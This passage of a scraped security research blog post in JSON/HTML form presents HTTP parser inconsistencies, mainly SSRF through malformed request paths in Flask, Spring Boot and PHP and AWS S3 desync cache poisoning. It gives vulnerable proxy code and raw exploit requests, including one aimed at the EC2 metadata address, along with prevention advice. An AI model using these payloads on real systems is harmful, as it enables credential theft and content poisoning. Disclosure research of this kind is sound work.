\u003ccode\u003e' or '1'='1' --\u003c/code\u003e as the value for the \u003ccode\u003eX-Query\u003c/code\u003e header. However, the AWS WAF treated it as a header name instead.\u003c/p\u003e\\n\u003cp\u003eThis bypass technique was reported to the AWS security team and fixed in 2022.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-incorrect-path-parsing-leads-to-server-side-request-forgery\\\"\u003eIncorrect Path Parsing Leads to Server-Side Request Forgery\u003c/h1\u003e\\n\u003cp\u003eIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\u003c/p\u003e\\n\u003cp\u003eIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\u003c/p\u003e\\n\u003cp\u003eNormally, a valid HTTP pathname starts with \u003ccode\u003e/\u003c/code\u003e or \u003ccode\u003ehttp(s)://domain/\u003c/code\u003e, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-ssrf-on-flask-through-incorrect-pathname-interpretation\\\"\u003eSSRF on Flask Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\u003c/p\u003e\\n\u003cp\u003eAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds \u003ccode\u003e404 Not Found\u003c/code\u003e:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e@/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful \u003ca target=\\\"_blank\\\" href=\\\"https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6\\\"\u003eMedium blog post\u003c/a\u003e that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e flask \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e Flask\\n\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e requests \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e get\\n\\napp = Flask(\u003cspan class=\\\"hljs-string\\\"\u003e'__main__'\u003c/span\u003e)\\nSITE_NAME = \u003cspan class=\\\"hljs-string\\\"\u003e'https://google.com/'\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eproxy\u003c/span\u003e(\u003cspan class=\\\"hljs-params\\\"\u003epath\u003c/span\u003e):\u003c/span\u003e\\n  \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\\\"hljs-string\\\"\u003ef'\u003cspan class=\\\"hljs-subst\\\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\\\"hljs-subst\\\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\\n\\napp.run(host=\u003cspan class=\\\"hljs-string\\\"\u003e'0.0.0.0'\u003c/span\u003e, port=\u003cspan class=\\\"hljs-number\\\"\u003e8080\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eMy first thought was: \\\"\u003cem\u003eWhat if the developer forgets to add the last slash in the\u003c/em\u003e \u003ccode\u003eSITE_NAME\u003c/code\u003e \u003cem\u003evariable?\u003c/em\u003e\\\". And yes, it can lead to an SSRF.\u003c/p\u003e\\n\u003cp\u003eSince Flask also allows any ASCII character after the \u003ccode\u003e@\u003c/code\u003e, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\u003c/p\u003e\\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e flask \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e Flask\\n\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e requests \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e get\\n\\napp = Flask(\u003cspan class=\\\"hljs-string\\\"\u003e'__main__'\u003c/span\u003e)\\nSITE_NAME = \u003cspan class=\\\"hljs-string\\\"\u003e'https://google.com'\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eproxy\u003c/span\u003e(\u003cspan class=\\\"hljs-params\\\"\u003epath\u003c/span\u003e):\u003c/span\u003e\\n  \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\\\"hljs-string\\\"\u003ef'\u003cspan class=\\\"hljs-subst\\\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\\\"hljs-subst\\\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\\n\\n\u003cspan class=\\\"hljs-keyword\\\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\\\"hljs-string\\\"\u003e\\\"__main__\\\"\u003c/span\u003e:\\n    app.run(threaded=\u003cspan class=\\\"hljs-literal\\\"\u003eFalse\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003ePresented below is an example of an exploitation request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e@evildomain.com/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIn the following example, I was able to fetch my EC2 metadata:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation\\\"\u003eSSRF on Spring Boot Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\u003c/p\u003e\\n\u003cp\u003eAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the \u003ccode\u003e?\u003c/code\u003e character, matrix parameters are separated by the \u003ccode\u003e;\u003c/code\u003e character within the URL.\u003c/p\u003e\\n\u003cp\u003eDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character \u003ccode\u003e;\u003c/code\u003e before the first slash of the HTTP pathname:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e;1337/api/v1/me\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\u003c/p\u003e\\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThe code snippet above utilizes the \u003ccode\u003eHttpServletRequest\u003c/code\u003e API to retrieve the requested URL through the \u003ccode\u003egetRequestURI()\u003c/code\u003e function. Subsequently, it concatenates the requested URI with the destination endpoint \u003ca href=\\\"http://ifconfig.me\\\" class=\\\"autolinkedURL autolinkedURL-url\\\" target=\\\"_blank\\\"\u003eifconfig.me\u003c/a\u003e.\u003c/p\u003e\\n\u003cp\u003eConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the \u003ccode\u003e@\u003c/code\u003e character to fetch an arbitrary endpoint as well.\u003c/p\u003e\\n\u003cp\u003eBelow is an example of the exploit request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e;@evil.com/url\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation\\\"\u003ePHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\u003c/p\u003e\\n\u003cp\u003eSurprisingly, PHP allows the asterisk \u003ccode\u003e*\u003c/code\u003e character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\u003c/p\u003e\\n\u003cp\u003eHowever, there are two limitations that arise with PHP:\u003c/p\u003e\\n\u003col\u003e\\n\u003cli\u003e\u003cp\u003eThis technique can only be used for the root pathname \u003ccode\u003e/\u003c/code\u003e and cannot be applied to other endpoints, in other words, the vulnerable code must be in the \u003ccode\u003eindex.php\u003c/code\u003e file;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eDots \u003ccode\u003e.\u003c/code\u003e are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ol\u003e\\n\u003cp\u003eLet's consider the following PHP code for this exploitation scenario:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-php\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e\u0026lt;?php\u003c/span\u003e\\n$site = \u003cspan class=\\\"hljs-string\\\"\u003e\\\"http://ifconfig.me\\\"\u003c/span\u003e;\\n$current_uri = $_SERVER[\u003cspan class=\\\"hljs-string\\\"\u003e'REQUEST_URI'\u003c/span\u003e];\\n\\n$proxy_site = $site.$current_uri;\\nvar_dump($proxy_site);\\n\\n\u003cspan class=\\\"hljs-keyword\\\"\u003eecho\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e\\\"\\\\n\\\\n\\\"\u003c/span\u003e;\\n\\n$response = file_get_contents($proxy_site);\\nvar_dump($response);\\n\u003cspan class=\\\"hljs-meta\\\"\u003e?\u0026gt;\u003c/span\u003e\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe provided code retrieves the HTTP request pathname using \u003ccode\u003e$_SERVER['REQUEST_URI']\u003c/code\u003e and concatenates it with the destination domain.\u003c/p\u003e\\n\u003cp\u003eFor performing IP address dotless-hex encoding, you can utilize the tool \u003ca target=\\\"_blank\\\" href=\\\"https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f\\\"\u003eip-encoder.py\u003c/a\u003e.\u003c/p\u003e\\n\u003cp\u003eThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e*@0xa9fea9fe/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIn the following proof of concept, I successfully retrieved my EC2 metadata:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-how-to-prevent-1\\\"\u003eHow to prevent\u003c/h2\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eIt is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as \u003ccode\u003ehttp://ifconfig.me/\u003c/code\u003e.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eUtilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003ch1 id=\\\"heading-http-desync-cache-poisoning-attacks\\\"\u003eHTTP Desync Cache Poisoning Attacks\u003c/h1\u003e\\n\u003cp\u003eInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\u003c/p\u003e\\n\u003cp\u003eBut before we continue, we must understand some functionalities of cache servers.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-cache-keys\\\"\u003eCache Keys\u003c/h2\u003e\\n\u003cp\u003eCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\u003c/p\u003e\\n\u003cp\u003eThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at \u003ccode\u003ehttps://target.com/static/main.js\u003c/code\u003e. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\u003c/p\u003e\\n\u003cp\u003eHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to \u003ccode\u003e1337.target.com\u003c/code\u003e, the cache server will attempt to retrieve the backend of the corresponding response for the \u003ccode\u003e/static/main.js\u003c/code\u003e URL using the \u003ccode\u003e1337.target.com\u003c/code\u003e host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-s3-http-desync-cache-poisoning-issue\\\"\u003eS3 HTTP Desync Cache Poisoning Issue\u003c/h2\u003e\\n\u003cp\u003eIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\u003c/p\u003e\\n\u003cp\u003eIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\u003c/p\u003e\\n\u003cp\u003eWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain \u003ccode\u003eyour.s3.amazonaws.com\u003c/code\u003e but changes the host header to \u003ccode\u003emy.s3.amazonaws.com\u003c/code\u003e, internally, AWS will \\\"ignore\\\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\u003c/p\u003e\\n\u003ch3 id=\\\"heading-the-vulnerability\\\"\u003eThe Vulnerability\u003c/h3\u003e\\n\u003cp\u003eThe interpretation of host headers for S3 buckets involves two key aspects:\u003c/p\u003e\\n\u003col\u003e\\n\u003cli\u003e\u003cp\u003eWhen multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eThe following bytes are ignored if present in the header name: \u003ccode\u003e\\\\x1f\u003c/code\u003e, \u003ccode\u003e\\\\x1d\u003c/code\u003e, \u003ccode\u003e\\\\x0c\u003c/code\u003e, \u003ccode\u003e\\\\x1e\u003c/code\u003e, \u003ccode\u003e\\\\x1c\u003c/code\u003e, \u003ccode\u003e\\\\x0b\u003c/code\u003e;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ol\u003e\\n\u003cp\u003eThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\u003c/p\u003e\\n\u003cp\u003eThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\u003c/p\u003e\\n\u003cp\u003eConsider the following exploitation request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e/\u003c/span\u003e HTTP/1.1\\n[\\\\x1d]Host: evilbucket.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: example.bucket.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eFirst, the cache server examines the header \u003ccode\u003e\\\\x1dHost: evilbucket.com\u003c/code\u003e and treats it like any other unkeyed header;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eSubsequently, the cache server will correctly interpret the \u003ccode\u003eexample.bucket.com\u003c/code\u003e header as a valid host header, resulting in the final cache response being associated with this host value.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eUpon reaching the S3 bucket, the header \u003ccode\u003e\\\\x1dHost: evilbucket.com\u003c/code\u003e will be mistakenly interpreted as a valid host header, while the intended \u003ccode\u003eHost: example.bucket.com\u003c/code\u003e header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003cp\u003eThe final result is a complete cache poisoning of the page with arbitrary content.\u003c/p\u003e\\n\u003cp\u003eThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\u003c/p\u003e\\n\u003cdiv class=\\\"embed-wrapper\\\"\u003e\u003cdiv class=\\\"embed-loading\\\"\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\\\"embed-card\\\" href=\\\"https://www.youtube.com/watch?v=dnf6Zi5eNW8\\\"\u003ehttps://www.youtube.com/watch?v=dnf6Zi5eNW8\u003c/a\u003e\u003c/div\u003e\\n\u003cp\u003e \u003c/p\u003e\\n\u003cp\u003eIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-conclusion\\\"\u003eConclusion\u003c/h1\u003e\\n\u003cp\u003eIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\u003c/p\u003e\\n\u003cp\u003eI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\u003c/p\u003e\\n\u003cp\u003eMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.\u003c/p\u003e\\n\",\"cuid\":\"clj09rtsw000109le1k4xblen\",\"views\":19538,\"title\":\"Exploiting HTTP Parsers Inconsistencies\",\"slug\":\"exploiting-http-parsers-inconsistencies\",\"dateAdded\":\"2023-06-17T17:25:25.280Z\",\"dateUpdated\":\"2023-10-23T11:36:22.929Z\",\"type\":\"story\",\"coverImage\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686855768304/932a6fc8-23cf-429f-88e2-bee9d6c0d010.png\",\"isCoverImagePortrait\":false,\"isCoverAttributionHidden\":false,\"brief\":\"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\\nIn this resea...\",\"isFollowing\":false,\"totalReactions\":43,\"totalReactionsByCurrentUser\":0,\"series\":null,\"isPinnedToBlog\":false,\"readTime\":17,\"sB\":false,\"isAMA\":false,\"subtitle\":\"Unveiling Vulnerabilities in HTTP Parsers: Exploiting Inconsistencies for Security Breaches\",\"isPartOfSeries\":false,\"hasTags\":true,\"pendingPublicationApproval\":false,\"ogImage\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022613860/91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif\",\"metaTitle\":\"(Research) Exploiting HTTP Parsers Inconsistencies\",\"metaDescription\":\"In this cybersecurity research, I'm going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF].\",\"isRepublished\":false,\"autoPublishedFromRSS\":false,\"responses\":[],\"isFeatured\":true,\"hasLatex\":false,\"stickCoverToBottom\":true,\"hideBadges\":false,\"badges\":[{\"name\":\"postFeaturedHN\"}],\"isDelisted\":false,\"audioUrls\":{},\"disableComments\":false,\"enableToc\":true,\"toc\":[[{\"id\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\",\"level\":1,\"slug\":\"pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules\",\"title\":\"Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\",\"parentId\":null}],[{\"id\":\"fa166e5c-0b0e-4957-8eb7-88f7c58f4415\",\"level\":2,\"slug\":\"nginx-acl-rules\",\"title\":\"Nginx ACL Rules\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"f5554760-21fd-4080-9078-0e9a31adb2c5\",\"level\":2,\"slug\":\"trim-inconsistencies\",\"title\":\"Trim Inconsistencies\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"04aa7506-34d7-4291-9c36-6f0429fef520\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-nodejs\",\"title\":\"Bypassing Nginx ACL Rules With Node.js\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"1d9a1daa-f753-4b31-9452-fb3bccc334c5\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-flask\",\"title\":\"Bypassing Nginx ACL Rules With Flask\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"bf06e637-fa3c-4b02-bbd0-535e8862ed60\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-spring-boot\",\"title\":\"Bypassing Nginx ACL Rules With Spring Boot\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"8d8306a9-c4fa-4c45-92fa-aebb2e886f80\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-php-fpm-integration\",\"title\":\"Bypassing Nginx ACL Rules With PHP-FPM Integration\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"80d340c5-2edf-4d76-a751-cb85c81df78c\",\"level\":2,\"slug\":\"how-to-prevent\",\"title\":\"How to prevent\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"6493de19-d626-479e-8986-84670b6f85ae\",\"level\":1,\"slug\":\"bypassing-aws-waf-acl\",\"title\":\"Bypassing AWS WAF ACL\",\"parentId\":null}],[{\"id\":\"df30fef9-02f8-47db-9cbe-1e49a3f36343\",\"level\":2,\"slug\":\"how-aws-waf-acls-work\",\"title\":\"How AWS WAF ACLs Work\",\"parentId\":\"6493de19-d626-479e-8986-84670b6f85ae\"}],[{\"id\":\"70a52fc0-b644-4cc4-a712-6eb7ad60fc7f\",\"level\":2,\"slug\":\"bypassing-aws-waf-acl-with-line-folding\",\"title\":\"Bypassing AWS WAF ACL With Line Folding\",\"parentId\":\"6493de19-d626-479e-8986-84670b6f85ae\"}],[{\"id\":\"268678d3-485e-49a1-89c3-048811a313e2\",\"level\":1,\"slug\":\"incorrect-path-parsing-leads-to-server-side-request-forgery\",\"title\":\"Incorrect Path Parsing Leads to Server-Side Request Forgery\",\"parentId\":null}],[{\"id\":\"1bcc7d29-1379-4cc8-8883-14c1c107dea2\",\"level\":2,\"slug\":\"ssrf-on-flask-through-incorrect-pathname-interpretation\",\"title\":\"SSRF on Flask Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"7b140771-f25b-4aab-94ee-5bd0cff5a2ae\",\"level\":2,\"slug\":\"ssrf-on-spring-boot-through-incorrect-pathname-interpretation\",\"title\":\"SSRF on Spring Boot Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"c40f232f-b920-4fda-9696-dcf62c980f49\",\"level\":2,\"slug\":\"php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation\",\"title\":\"PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"79b3a29d-790b-405f-89b2-bfadc5a39975\",\"level\":2,\"slug\":\"how-to-prevent-1\",\"title\":\"How to prevent\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\",\"level\":1,\"slug\":\"http-desync-cache-poisoning-attacks\",\"title\":\"HTTP Desync Cache Poisoning Attacks\",\"parentId\":null}],[{\"id\":\"73d5400e-1c74-4ecf-92d6-6cbecd247573\",\"level\":2,\"slug\":\"cache-keys\",\"title\":\"Cache Keys\",\"parentId\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\"}],[{\"id\":\"81f4c133-20bb-4d3e-afcf-117cf80024c6\",\"level\":2,\"slug\":\"s3-http-desync-cache-poisoning-issue\",\"title\":\"S3 HTTP Desync Cache Poisoning Issue\",\"parentId\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\"}],[{\"id\":\"7ec99b8e-175c-4a52-aa2f-84d419d9ec8e\",\"level\":3,\"slug\":\"the-vulnerability\",\"title\":\"The 